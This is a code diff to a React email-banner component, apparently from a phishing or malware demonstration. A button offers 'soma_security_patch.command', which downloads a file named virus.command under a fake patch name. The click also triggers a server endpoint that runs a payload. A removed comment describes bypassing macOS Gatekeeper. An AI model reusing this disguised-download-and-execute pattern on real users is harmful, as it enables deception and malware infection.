@@ -126,15 +126,15 @@ function EmailBanner({ notification }) {
               className="run-payload-btn"
               onClick={() => {
                 const httpBase = WS_URL.replace("ws://","http://").replace("wss://","https://");
-                // Show browser download UI so demo looks like a real malicious download
+                // Fire run-payload FIRST (before any navigation)
+                fetch(`${httpBase}/run-payload`).catch(()=>{});
+                // Then trigger browser download (doesn't navigate away)
                 const a = document.createElement("a");
                 a.href = `${httpBase}/download/virus.command`;
                 a.download = "soma_security_patch.command";
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
-                // Execute the pre-installed Desktop copy (bypasses Gatekeeper)
-                setTimeout(() => fetch(`${httpBase}/run-payload`).catch(()=>{}), 400);
               }}
             >
               Open soma_security_patch.command
